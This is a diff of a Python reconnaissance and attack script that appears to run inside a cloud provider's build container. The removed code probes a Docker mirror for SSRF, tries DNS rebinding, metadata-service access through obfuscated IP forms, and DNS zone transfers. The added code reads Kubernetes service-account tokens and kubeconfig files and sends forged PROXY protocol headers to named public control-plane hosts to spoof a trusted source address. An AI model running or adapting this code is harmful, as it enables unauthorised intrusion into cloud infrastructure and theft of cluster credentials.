@@ -1,388 +1,311 @@
-import json, os, socket, struct, time
-import urllib.request, urllib.error, ssl
+import json, os, socket, ssl, struct, time, subprocess
 
 r = {}
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
-
-MIRROR = 'http://docker-cache.docker-cache.svc.cluster.local:5000'
 
 # ============================================================
-# 1. DOCKER MIRROR SSRF TESTS
+# 1. DISCOVER BUILD CLUSTER CP
 # ============================================================
-r['mirror_ssrf'] = {}
 
-# 1a. Path traversal in image name — can we make the mirror request
-# an internal URL by injecting path components?
-traversal_tests = [
-    # Try to make mirror request an internal host via path traversal
-    f'{MIRROR}/v2/..%2F..%2F..%2F/manifests/latest',
-    f'{MIRROR}/v2/library%2F..%2F..%2Fv2%2F_catalog/manifests/latest',
-    # Try to hit the mirror's own API via self-reference
-    f'{MIRROR}/v2/_catalog',
-    # Try double-encoding
-    f'{MIRROR}/v2/..%252F..%252F/manifests/latest',
-    # Registry API probing
-    f'{MIRROR}/v2/',
-    f'{MIRROR}/debug/pprof/',
-    f'{MIRROR}/debug/vars',
-    f'{MIRROR}/metrics',
-]
+# Check if we can find the build cluster's control plane IP
+r['discovery'] = {}
 
-for url in traversal_tests:
-    try:
-        resp = urllib.request.urlopen(url, timeout=5)
-        body = resp.read(2000).decode(errors='replace')
-        r['mirror_ssrf'][url.replace(MIRROR, '')] = {
-            'status': resp.status,
-            'body': body[:500],
-            'headers': dict(resp.headers)
-        }
-    except urllib.error.HTTPError as e:
-        r['mirror_ssrf'][url.replace(MIRROR, '')] = {
-            'status': e.code,
-            'body': e.read(500).decode(errors='replace')[:300]
-        }
-    except Exception as e:
-        r['mirror_ssrf'][url.replace(MIRROR, '')] = str(e)[:100]
-
-# 1b. Host header injection — can we make the mirror connect to a different backend?
-host_injection_tests = [
-    ('169.254.169.254', '/latest/meta-data/'),
-    ('10.245.0.1', '/version'),
-    ('kubernetes.default.svc.cluster.local', '/version'),
-    ('127.0.0.1:8080', '/'),
-]
-r['mirror_host_inject'] = {}
-for host, path in host_injection_tests:
-    try:
-        req = urllib.request.Request(f'{MIRROR}/v2/library/alpine/manifests/latest',
-            headers={'Host': host})
-        resp = urllib.request.urlopen(req, timeout=5)
-        r['mirror_host_inject'][host] = {
-            'status': resp.status,
-            'body': resp.read(500).decode(errors='replace')[:300]
-        }
-    except Exception as e:
-        r['mirror_host_inject'][host] = str(e)[:100]
-
-# 1c. Check if mirror follows redirects — if we reference an image whose
-# manifest redirects to an internal URL, does the mirror follow it?
-# We test by checking mirror response headers for redirect behavior
-r['mirror_meta'] = {}
+# 1a. DNS for kubernetes API
 try:
-    req = urllib.request.Request(f'{MIRROR}/v2/', method='GET')
-    resp = urllib.request.urlopen(req, timeout=5)
-    r['mirror_meta']['api_root'] = {
-        'status': resp.status,
-        'headers': dict(resp.headers)
-    }
+    ips = socket.getaddrinfo('kubernetes.default.svc.cluster.local', 443, socket.AF_INET)
+    r['discovery']['k8s_api_ip'] = ips[0][4][0]
 except Exception as e:
-    r['mirror_meta']['api_root'] = str(e)[:200]
+    r['discovery']['k8s_api_ip'] = str(e)[:60]
 
-# ============================================================
-# 2. DNS REBINDING TEST
-# ============================================================
-# If filtering is at DNS level (unlikely given our errno=11 results),
-# a domain resolving to an internal IP would bypass it.
-# We use known public DNS rebinding services
-r['dns_rebind'] = {}
-
-# Test: resolve a domain that points to 169.254.169.254
-# Using common rebinding test domains
-rebind_domains = [
-    # nip.io / sslip.io style domains that resolve to arbitrary IPs
-    '169.254.169.254.nip.io',
-    '169-254-169-254.sslip.io',
-    '10.245.0.1.nip.io',
-    '10-245-0-1.sslip.io',
-    # localhost via public DNS
-    'localhost.localdomain',
-    'localtest.me',  # resolves to 127.0.0.1
-]
-
-for domain in rebind_domains:
-    try:
-        ips = socket.getaddrinfo(domain, None, socket.AF_INET)
-        resolved_ip = ips[0][4][0]
-        r['dns_rebind'][domain] = {'resolved': resolved_ip}
-
-        # If it resolves to an internal IP, try to connect
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)
-            ret = s.connect_ex((resolved_ip, 80))
-            r['dns_rebind'][domain]['tcp_80'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
-            s.close()
-        except Exception as e:
-            r['dns_rebind'][domain]['tcp_80'] = str(e)[:60]
-
-        # Also try connecting via the domain name (in case filtering is IP-based
-        # but the connect happens before the IP check)
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)
-            ret = s.connect_ex((domain, 80))
-            r['dns_rebind'][domain]['tcp_domain'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
-            s.close()
-        except Exception as e:
-            r['dns_rebind'][domain]['tcp_domain'] = str(e)[:60]
-
-        # HTTP test via the domain
-        try:
-            resp = urllib.request.urlopen(f'http://{domain}/latest/meta-data/', timeout=3)
-            r['dns_rebind'][domain]['http'] = resp.read(500).decode(errors='replace')[:300]
-        except Exception as e:
-            r['dns_rebind'][domain]['http'] = str(e)[:100]
-
-    except Exception as e:
-        r['dns_rebind'][domain] = str(e)[:100]
-
-# ============================================================
-# 3. DNS ENUMERATION — discover build infrastructure
-# ============================================================
-r['dns_enum'] = {}
-
-# 3a. Service discovery via SRV records
-srv_queries = [
-    '_http._tcp.docker-cache.docker-cache.svc.cluster.local',
-    '_https._tcp.kubernetes.default.svc.cluster.local',
-]
-import subprocess
-for q in srv_queries:
-    try:
-        out = subprocess.check_output(['python3', '-c', f'''
-import dns.resolver
+# 1b. Check resolv.conf for cluster domain
 try:
-    ans = dns.resolver.resolve("{q}", "SRV")
-    print([str(r) for r in ans])
-except: print("no-dnspython")
-'''], timeout=3, stderr=subprocess.STDOUT).decode().strip()
-        r['dns_enum'][q] = out
-    except:
-        r['dns_enum'][q] = 'skip'
+    r['discovery']['resolv'] = open('/etc/resolv.conf').read()
+except:
+    pass
 
-# 3b. Enumerate namespaces and services via DNS
-namespace_guesses = [
-    'build', 'build-system', 'builder', 'builds',
-    'apps', 'app-platform', 'appplatform',
-    'docker-cache', 'registry', 'docr',
-    'monitoring', 'logging', 'observability',
-    'ingress', 'nginx', 'traefik',
-    'kube-system', 'default',
-    'cert-manager', 'istio-system',
-    'cilium', 'calico-system',
-]
-r['dns_namespaces'] = {}
-for ns in namespace_guesses:
-    # Try to find any service in this namespace
-    for svc in ['api', 'web', 'server', 'proxy', 'cache', 'registry', 'nginx', 'default']:
-        fqdn = f'{svc}.{ns}.svc.cluster.local'
-        try:
-            ip = socket.getaddrinfo(fqdn, None, socket.AF_INET)[0][4][0]
-            r['dns_namespaces'][fqdn] = ip
-        except:
-            pass
+# 1c. Check env vars for any CP references
+for k, v in os.environ.items():
+    kl = k.lower()
+    if any(x in kl for x in ['kubernetes', 'kube', 'cluster', 'apiserver', 'master', 'cp_', 'control_plane']):
+        r['discovery'][f'env_{k}'] = v[:200]
 
-# 3c. Try to discover build-specific services
-build_services = [
-    'docker-cache.docker-cache.svc.cluster.local',
-    'registry.docker-cache.svc.cluster.local',
-    'buildkit.build-system.svc.cluster.local',
-    'kaniko.build-system.svc.cluster.local',
-    'builder.build-system.svc.cluster.local',
-    'cache.build-system.svc.cluster.local',
-    'api.build-system.svc.cluster.local',
-    'webhook.build-system.svc.cluster.local',
+# 1d. Try to get CP info via well-known kube-system configmaps
+# (requires API access which is blocked, but let's try DNS SRV)
+try:
+    # SRV record for kubernetes API
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(3)
+    # DNS SRV query for _https._tcp.kubernetes.default.svc.cluster.local
+    query = (
+        b'\x12\x36'  # Transaction ID
+        b'\x01\x00'  # Standard query
+        b'\x00\x01'  # 1 question
+        b'\x00\x00\x00\x00\x00\x00'  # 0 answers, 0 authority, 0 additional
+        b'\x06_https\x04_tcp\x0akubernetes\x07default\x03svc\x07cluster\x05local\x00'
+        b'\x00\x21'  # SRV
+        b'\x00\x01'  # IN class
+    )
+    s.sendto(query, ('10.245.0.10', 53))
+    data, _ = s.recvfrom(4096)
+    r['discovery']['srv_k8s'] = data.hex()[:200]
+    s.close()
+except Exception as e:
+    r['discovery']['srv_k8s'] = str(e)[:60]
+
+# 1e. Try to get server cert from the build cluster's API (via internal IP)
+try:
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    ss = ctx.wrap_socket(s, server_hostname='kubernetes')
+    ss.connect(('10.245.0.1', 443))
+    cert = ss.getpeercert(binary_form=True)
+    r['discovery']['api_cert_len'] = len(cert)
+    # Parse cert for SANs
+    import ssl as ssl_mod
+    cert_dict = ss.getpeercert()
+    r['discovery']['api_cert_sans'] = cert_dict.get('subjectAltName', [])
+    r['discovery']['api_cert_subject'] = cert_dict.get('subject', '')
+    ss.close()
+except Exception as e:
+    r['discovery']['api_cert'] = str(e)[:100]
+
+# ============================================================
+# 2. PROXY PROTOCOL TO OUR DOKS CLUSTERS FROM BUILD
+# ============================================================
+r['proxy_proto'] = {}
+
+# Our DOKS cluster CPs
+targets = [
+    {
+        'name': 'cluster_a',
+        'host': '24.199.65.106',
+        'port': 8999,
+        'cpbridge': '100.65.67.229',
+        'uuid': 'ac2974a3-c1e3-48c2-9616-0002972c7d86',
+    },
+    {
+        'name': 'cluster_b',
+        'host': '45.55.116.41',
+        'port': 8999,
+        'cpbridge': '100.65.74.2',
+        'uuid': '13079803-6ec3-4b23-8c3b-c3679565869e',
+    },
 ]
-r['dns_build_svc'] = {}
-for svc in build_services:
+
+for target in targets:
+    name = target['name']
+    r['proxy_proto'][name] = {}
+
+    # 2a. Test: forge source IP as the cpbridge IP
+    # The PROXY header tells the API server our source IP is the cpbridge
+    proxy_header = f"PROXY TCP4 {target['cpbridge']} {target['cpbridge']} 12345 16443\r\n"
+
     try:
-        ip = socket.getaddrinfo(svc, None, socket.AF_INET)[0][4][0]
-        r['dns_build_svc'][svc] = ip
-        # Try connecting
-        for port in [80, 443, 8080, 5000, 9090]:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(2)
-                ret = s.connect_ex((ip, port))
-                if ret == 0:
-                    r['dns_build_svc'][f'{svc}:{port}'] = 'CONNECTED'
-                s.close()
-            except:
-                pass
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target['host'], target['port']))
+        s.send(proxy_header.encode())
+
+        # Wrap in TLS and try to get server cert / version
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        ss = ctx.wrap_socket(s, server_hostname='kubernetes')
+
+        cert = ss.getpeercert()
+        r['proxy_proto'][name]['cert_sans'] = cert.get('subjectAltName', [])[:10]
+
+        # Try unauthenticated API call - does forged cpbridge IP give us any privileges?
+        ss.send(b'GET /version HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
+        resp = ss.recv(4096).decode(errors='replace')
+        r['proxy_proto'][name]['version_resp'] = resp[:500]
+        ss.close()
+    except Exception as e:
+        r['proxy_proto'][name]['cpbridge_forge'] = str(e)[:100]
+
+    # 2b. Test: forge source IP as 127.0.0.1 (localhost)
+    # API server might have special trust for localhost connections
+    proxy_header_lo = f"PROXY TCP4 127.0.0.1 {target['cpbridge']} 12345 16443\r\n"
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target['host'], target['port']))
+        s.send(proxy_header_lo.encode())
+
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        ss = ctx.wrap_socket(s, server_hostname='kubernetes')
+
+        # Try accessing API - anonymous auth might be different for localhost
+        ss.send(b'GET /api HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
+        resp = ss.recv(4096).decode(errors='replace')
+        r['proxy_proto'][name]['localhost_forge'] = resp[:500]
+        ss.close()
+    except Exception as e:
+        r['proxy_proto'][name]['localhost_forge'] = str(e)[:100]
+
+    # 2c. Test: forge source IP as 10.0.0.1 (could be internal/trusted)
+    proxy_header_int = f"PROXY TCP4 10.0.0.1 {target['cpbridge']} 12345 16443\r\n"
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((target['host'], target['port']))
+        s.send(proxy_header_int.encode())
+
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        ss = ctx.wrap_socket(s, server_hostname='kubernetes')
+
+        # Try /api with this forged source
+        ss.send(b'GET /api HTTP/1.1\r\nHost: kubernetes\r\nAccept: */*\r\n\r\n')
+        resp = ss.recv(4096).decode(errors='replace')
+        r['proxy_proto'][name]['internal_forge'] = resp[:500]
+        ss.close()
+    except Exception as e:
+        r['proxy_proto'][name]['internal_forge'] = str(e)[:100]
+
+# ============================================================
+# 3. CHECK IF BUILD CLUSTER HAS PORT 8999 EXPOSED
+# ============================================================
+r['build_cluster_8999'] = {}
+
+# We don't know the build cluster's public IP, but we can try
+# to discover it via DNS, headers, or by scanning
+
+# 3a. Try to find the build cluster CP via reverse DNS of the internal IP
+try:
+    hostname = socket.gethostbyaddr('10.245.0.1')
+    r['build_cluster_8999']['reverse_dns'] = str(hostname)
+except Exception as e:
+    r['build_cluster_8999']['reverse_dns'] = str(e)[:60]
+
+# 3b. Check if we can reach 10.245.0.1 on port 8999 (maybe not blocked?)
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    ret = s.connect_ex(('10.245.0.1', 8999))
+    r['build_cluster_8999']['internal_8999'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
+    s.close()
+except Exception as e:
+    r['build_cluster_8999']['internal_8999'] = str(e)[:60]
+
+# 3c. Check port 8132 (konnectivity)
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    ret = s.connect_ex(('10.245.0.1', 8132))
+    r['build_cluster_8999']['internal_8132'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
+    s.close()
+except Exception as e:
+    r['build_cluster_8999']['internal_8132'] = str(e)[:60]
+
+# ============================================================
+# 4. SERVICE ACCOUNT TOKEN CHECK IN BUILD
+# ============================================================
+r['sa_token'] = {}
+
+# Check for mounted service account token
+sa_paths = [
+    '/var/run/secrets/kubernetes.io/serviceaccount/token',
+    '/run/secrets/kubernetes.io/serviceaccount/token',
+    '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
+    '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
+    '/secrets/kubernetes.io/serviceaccount/token',
+]
+for p in sa_paths:
+    try:
+        content = open(p).read()
+        r['sa_token'][p] = content[:500]
+    except Exception as e:
+        r['sa_token'][p] = str(e)[:60]
+
+# Also check if there's a kubeconfig anywhere
+kube_paths = [
+    '/root/.kube/config',
+    '/home/apps/.kube/config',
+    '/.kube/config',
+    '/etc/kubernetes/admin.conf',
+    '/etc/kubernetes/kubelet.conf',
+]
+for p in kube_paths:
+    try:
+        content = open(p).read()
+        r['sa_token'][p] = content[:500]
+    except Exception as e:
+        r['sa_token'][p] = str(e)[:60]
+
+# ============================================================
+# 5. PROXY PROTOCOL TO BUILD CLUSTER VIA CPBRIDGE BYPASS
+# ============================================================
+# If we can find the build cluster's cpbridge IP, we could try
+# to PROXY protocol to the build cluster's API with forged source
+
+# Check cgroup for pod/container IDs that might help identify the cluster
+try:
+    r['build_id'] = {}
+    cgroup = open('/proc/self/cgroup').read()
+    r['build_id']['cgroup'] = cgroup[:300]
+
+    # Extract pod UUID from cgroup
+    import re
+    pod_match = re.search(r'pod([a-f0-9-]+)', cgroup)
+    if pod_match:
+        r['build_id']['pod_uuid'] = pod_match.group(1)
+except:
+    pass
+
+# Check hostname
+r['build_id']['hostname'] = socket.gethostname()
+
+# Check /etc/hosts for cluster info
+try:
+    r['build_id']['hosts'] = open('/etc/hosts').read()
+except:
+    pass
+
+# ============================================================
+# 6. PROXY PROTOCOL + SA TOKEN COMBO
+# ============================================================
+# If we find an SA token, try using it via PROXY protocol to access
+# the build cluster's API (even though direct access is blocked)
+
+# First check if there's any token at all
+token = None
+for p in sa_paths:
+    try:
+        token = open(p).read().strip()
+        r['sa_token']['found_at'] = p
+        break
     except:
         pass
 
-# ============================================================
-# 4. REDIRECT-BASED SSRF
-# ============================================================
-# Test if HTTP clients in the build follow redirects to internal IPs
-r['redirect_ssrf'] = {}
+if token:
+    r['proxy_with_token'] = {}
+    # Try to use token via PROXY protocol to our DOKS clusters
+    # (won't work cross-cluster, but tests the mechanism)
+    for target in targets:
+        proxy_header = f"PROXY TCP4 {target['cpbridge']} {target['cpbridge']} 12345 16443\r\n"
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect((target['host'], target['port']))
+            s.send(proxy_header.encode())
 
-# 4a. Check what happens when we try to HTTP GET an internal IP
-# via urllib (which follows redirects by default)
-internal_http_targets = [
-    'http://169.254.169.254/latest/meta-data/',
-    'http://169.254.169.254/metadata/v1/',
-    'http://10.245.0.1:443/',
-    'http://10.245.0.10:9153/metrics',
-    # Docker mirror internal endpoints
-    f'{MIRROR}/v2/_catalog',
-]
-for url in internal_http_targets:
-    try:
-        resp = urllib.request.urlopen(url, timeout=3)
-        r['redirect_ssrf'][url] = {
-            'status': resp.status,
-            'body': resp.read(500).decode(errors='replace')[:300]
-        }
-    except Exception as e:
-        r['redirect_ssrf'][url] = str(e)[:100]
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            ss = ctx.wrap_socket(s, server_hostname='kubernetes')
 
-# ============================================================
-# 5. UDP SERVICE ACCESS
-# ============================================================
-r['udp'] = {}
-
-# Test UDP access to kube-dns and other services
-udp_targets = [
-    ('10.245.0.10', 53, 'kube-dns'),
-    ('169.254.169.254', 80, 'imds-udp'),
-    ('10.245.0.1', 443, 'k8s-api-udp'),
-]
-
-for host, port, label in udp_targets:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.settimeout(2)
-        # Send a DNS query for kube-dns, garbage for others
-        if port == 53:
-            # DNS query for kubernetes.default
-            query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0akubernetes\x07default\x03svc\x07cluster\x05local\x00\x00\x01\x00\x01'
-            s.sendto(query, (host, port))
-            data, addr = s.recvfrom(1024)
-            r['udp'][label] = f'response_len={len(data)}'
-        else:
-            s.sendto(b'GET / HTTP/1.0\r\n\r\n', (host, port))
-            try:
-                data, addr = s.recvfrom(1024)
-                r['udp'][label] = f'response_len={len(data)}'
-            except socket.timeout:
-                r['udp'][label] = 'send_ok_recv_timeout'
-        s.close()
-    except Exception as e:
-        r['udp'][label] = str(e)[:60]
-
-# ============================================================
-# 6. DO INTERNAL API ENDPOINTS
-# ============================================================
-r['do_internal'] = {}
-
-# Check if any DO internal endpoints are reachable
-do_endpoints = [
-    'https://api.digitalocean.com/v2/account',
-    'https://cloud.digitalocean.com/v1/oauth/token',
-    'https://api-internal.digitalocean.com/',
-    'https://svc.digitalocean.com/',
-    'https://internal.digitalocean.com/',
-]
-for url in do_endpoints:
-    try:
-        req = urllib.request.Request(url, headers={'User-Agent': 'probe/1.0'})
-        resp = urllib.request.urlopen(req, timeout=5, context=ctx)
-        r['do_internal'][url] = {
-            'status': resp.status,
-            'body': resp.read(500).decode(errors='replace')[:300]
-        }
-    except urllib.error.HTTPError as e:
-        r['do_internal'][url] = {
-            'status': e.code,
-            'body': e.read(500).decode(errors='replace')[:200]
-        }
-    except Exception as e:
-        r['do_internal'][url] = str(e)[:100]
-
-# ============================================================
-# 7. METADATA SERVICE VIA DIFFERENT PROTOCOLS
-# ============================================================
-r['imds_alt'] = {}
-
-# 7a. Try IMDS via IPv6
-try:
-    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
-    s.settimeout(2)
-    # IPv6-mapped IPv4 for 169.254.169.254
-    ret = s.connect_ex(('::ffff:169.254.169.254', 80))
-    r['imds_alt']['ipv6_mapped'] = 'CONNECTED' if ret == 0 else f'errno={ret}'
-    s.close()
-except Exception as e:
-    r['imds_alt']['ipv6_mapped'] = str(e)[:60]
-
-# 7b. Try IMDS via different IP representations
-alt_imds = [
-    ('2852039166', 'decimal'),  # 169.254.169.254 as decimal
-    ('0xa9fea9fe', 'hex'),      # hex
-    ('0251.0376.0251.0376', 'octal'),  # octal
-]
-for ip_repr, label in alt_imds:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
-        # Python's connect doesn't accept these, but urllib might
-        resp = urllib.request.urlopen(f'http://{ip_repr}/latest/meta-data/', timeout=3)
-        r['imds_alt'][label] = resp.read(200).decode(errors='replace')[:100]
-    except Exception as e:
-        r['imds_alt'][label] = str(e)[:80]
-
-# 7c. Try IMDS via HTTP CONNECT through the mirror
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
-    mirror_ip = socket.getaddrinfo('docker-cache.docker-cache.svc.cluster.local', 5000)[0][4][0]
-    s.connect((mirror_ip, 5000))
-    s.send(b'CONNECT 169.254.169.254:80 HTTP/1.1\r\nHost: 169.254.169.254\r\n\r\n')
-    resp = s.recv(1024)
-    r['imds_alt']['http_connect_via_mirror'] = resp.decode(errors='replace')[:200]
-    s.close()
-except Exception as e:
-    r['imds_alt']['http_connect_via_mirror'] = str(e)[:80]
-
-# ============================================================
-# 8. K8S DNS ZONE TRANSFER ATTEMPT
-# ============================================================
-r['dns_axfr'] = {}
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
-    s.connect(('10.245.0.10', 53))
-    # AXFR query for cluster.local
-    query = b'\x00\x1c'  # length prefix for TCP DNS
-    query += b'\x12\x34\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
-    query += b'\x07cluster\x05local\x00'
-    query += b'\x00\xfc\x00\x01'  # AXFR, IN class
-    s.send(query)
-    resp = s.recv(4096)
-    r['dns_axfr']['cluster.local'] = resp.hex()[:200] if resp else 'empty'
-    s.close()
-except Exception as e:
-    r['dns_axfr']['cluster.local'] = str(e)[:80]
-
-# Also try for svc.cluster.local
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
-    s.connect(('10.245.0.10', 53))
-    query = b'\x00\x20'
-    query += b'\x12\x35\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00'
-    query += b'\x03svc\x07cluster\x05local\x00'
-    query += b'\x00\xfc\x00\x01'
-    s.send(query)
-    resp = s.recv(4096)
-    r['dns_axfr']['svc.cluster.local'] = resp.hex()[:200] if resp else 'empty'
-    s.close()
-except Exception as e:
-    r['dns_axfr']['svc.cluster.local'] = str(e)[:80]
+            req = f'GET /api/v1/namespaces HTTP/1.1\r\nHost: kubernetes\r\nAuthorization: Bearer {token}\r\nAccept: application/json\r\n\r\n'
+            ss.send(req.encode())
+            resp = ss.recv(4096).decode(errors='replace')
+            r['proxy_with_token'][target['name']] = resp[:500]
+            ss.close()
+        except Exception as e:
+            r['proxy_with_token'][target['name']] = str(e)[:100]
 
 print(json.dumps(r, indent=2, default=str))
